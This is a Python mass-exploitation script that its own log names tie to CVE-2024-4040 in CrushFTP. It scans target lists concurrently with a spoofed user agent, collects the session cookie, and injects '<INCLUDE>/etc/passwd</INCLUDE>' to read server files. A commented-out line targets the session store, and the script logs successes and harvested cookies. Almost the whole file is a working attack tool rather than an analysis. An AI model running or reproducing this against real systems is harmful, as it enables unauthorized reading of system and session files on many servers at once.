import argparse
import asyncio
import csv
import logging
import time
from datetime import datetime
from functools import wraps
from urllib.parse import urlunparse

import aiofiles
import httpx
from faker import Faker

FAKE = Faker()

HEADERS = {
    "User-Agent": FAKE.user_agent()
}

TIMEOUT = 12.0

def timeit(func):
    @wraps(func)
    async def wrapper(*args, **kwargs):
        start_time = time.monotonic()
        result = await func(*args, **kwargs)
        end_time = time.monotonic()
        print(f"Execution time: {end_time - start_time:.2f} seconds")
        return result
    return wrapper

def setup_loggers():
    message_logger = logging.getLogger("message")
    message_logger.setLevel(logging.DEBUG)
    message_handler = logging.FileHandler(f"CVE-2024-4040-{datetime.now().strftime('%Y%m%d-%H%M%S')}.log")
    message_handler.setFormatter(logging.Formatter('%(message)s'))
    message_logger.addHandler(message_handler)

    cookies_logger = logging.getLogger("cookies")
    cookies_logger.setLevel(logging.DEBUG)
    cookies_handler = logging.FileHandler(f"cookies-{datetime.now().strftime('%Y%m%d-%H%M%S')}.log")
    cookies_handler.setFormatter(logging.Formatter('%(message)s'))
    cookies_logger.addHandler(cookies_handler)

    return message_logger, cookies_logger

MESSAGE_LOGGER, COOKIES_LOGGER = setup_loggers()


def fix_base_url(host: str, protocol: str, ip: str, domain: str, port, **kwargs):
    if "://" in host:
        protocol_split = host.split("://", 1)
        scheme = protocol_split[0]
        netloc = protocol_split[1]
    else:
        scheme = protocol
        netloc = host
    
    if ":" in netloc:
        netloc_split = netloc.split(":", 1)
        base_host = netloc_split[0]
        port_from_host = netloc_split[1]
    else:
        base_host = netloc
        port_from_host = port

    if base_host and port_from_host:
        return urlunparse((scheme, f"{base_host}:{port_from_host}", '', '', '', ''))
    
    final_netloc = f"{domain if domain else ip}:{port_from_host}"
    return urlunparse((scheme, final_netloc, '', '', '', ''))


async def async_read_csv(file_path, encoding="utf-8-sig"):
    async with aiofiles.open(file_path, mode='r', encoding=encoding) as file:
        header = next(csv.reader([await file.readline()]))
        async for line in file:
            row = next(csv.reader([line]))
            if len(row) != len(header):
                print(f"Error: Invalid row in CSV file: {row}")
                break
            yield dict(zip(header, row, strict=True))


def handle_exceptions(func):
    async def wrapper(*args, **kwargs):
        try:
            base_url, cookies, message = await func(*args, **kwargs)
            MESSAGE_LOGGER.info(message)
            COOKIES_LOGGER.info(f"{base_url}\t{cookies}")
            if '[+] [200]' in message:
                print(f"[*] [{base_url}] Success")
        except httpx.RequestError as e:
            MESSAGE_LOGGER.error(f"[*] [{e.request.url}] RequestError: {e}")
        except httpx.TimeoutException as e:
            MESSAGE_LOGGER.error(f"[*] [{e.request.url}] Request timed out")
        except httpx.HTTPStatusError as e:
            MESSAGE_LOGGER.error(f"[*] [{e.request.url}] HTTPStatusError: {e.response.status_code}")
        except Exception as e:
            MESSAGE_LOGGER.error(f"[*] Unhandled Exception: {e}")
        return None
    return wrapper


@handle_exceptions
async def exploit(target: dict | str):
    base_url = None
    if isinstance(target, str):
        base_url = target
    else:
        base_url = fix_base_url(**target)
    if base_url is None:
        raise ValueError("Invalid target")
    
    message = None
    paths = [
        "/WebInterface/",
        "/WebInterface/login.html"
    ]
    async with httpx.AsyncClient(
        headers=HEADERS,
        verify=False, # noqa: S501
        follow_redirects=True,
        max_redirects=1,
        timeout=TIMEOUT
    ) as client:
        for web_path in paths:
            await asyncio.sleep(0.3)
            response = await client.get(f"{base_url}{web_path}")
            if client.cookies.get("currentAuth"):
                message = f"[-] [{response.status_code}]\t[{base_url}] target exist\n{response.cookies}\n"
                current_auth = client.cookies.get("currentAuth")
                break
            else:
                message = f"[-] [{response.status_code}]\t[{base_url}] target not exist\n{response.cookies}\n"

        if current_auth:
            exec_codes = {
                r"<INCLUDE>/etc/passwd</INCLUDE>": "root",
                # r"<INCLUDE>sessions.obj</INCLUDE>": "tcrushftp.session"
            }
            for key, value in exec_codes.items():
                data = {
                    "c2f": current_auth,
                    "command": "zip",
                    "path": key,
                    "names": "/home"
                }
                await asyncio.sleep(0.3)
                response = await client.post(f"{base_url}/WebInterface/function/", data=data)
                if response.status_code == 200 and key not in response.text and value in response.text:
                    message += f"[+] [200]\t[{base_url}] {response.text}\n"
                    break
                else:
                    message += f"[-] [{response.status_code}]\t[{base_url}] {response.text}\n"

    return base_url, dict(client.cookies.items()), message

async def request_task(queue: asyncio.Queue):
    while True:
        target = await queue.get()
        if target:
            await exploit(target)
        queue.task_done()


async def task_manager(csv_file, task_num=400, queue_size=10000):
    queue = asyncio.Queue(queue_size)

    tasks = [asyncio.create_task(request_task(queue)) for _ in range(task_num)]

    async for target in async_read_csv(csv_file):
        await queue.put(target)
    
    await queue.join()
    await asyncio.sleep(TIMEOUT * 1.5)
    
    for task in tasks:
        task.cancel()

    await asyncio.gather(*tasks, return_exceptions=True)


@timeit
async def main():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="URL of the target")
    group.add_argument("-f", "--file", help="Path to the target file")
    args = parser.parse_args()

    match args:
        case _ if args.file:
            await task_manager(args.file)
        case _ if args.url:
            async with httpx.AsyncClient(
                headers=HEADERS,
                verify=False, # noqa: S501
                follow_redirects=True,
                max_redirects=1,
                timeout=TIMEOUT
            ) as client:
                await exploit(client, args.url)


if __name__ == "__main__":
    asyncio.run(main())